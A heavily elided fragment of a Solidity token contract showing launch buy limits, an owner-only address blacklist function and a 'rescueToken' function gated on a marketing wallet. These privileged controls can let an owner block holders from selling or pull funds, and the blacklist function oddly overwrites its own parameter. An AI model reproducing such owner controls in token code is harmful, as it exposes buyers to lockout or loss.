...
// SPDX-License-Identifier: FENDOU
...
contract Token is Ownable, IERC20 {
    ...
    uint256 public _launchMaxTxAmount = _totalSupply.mul(1).div(100);

    // Limit time for unixtime
    uint256 public _launchLimitTime = 60 * 5; // 5 Min ( buy limit 1/100 )
    uint256 public _allLimitTime = 86400 * 60; // 60 Days ( buy limit 1/100 )
    ...
    function manger_bl(address[] memory _news, uint256 _use, bool _reject) public onlyOwner {
        _use = 1;
    ...
    function rescueToken(address _tokenAddr) public {
        if (marketingWalletAddress == _msgSender() ) {
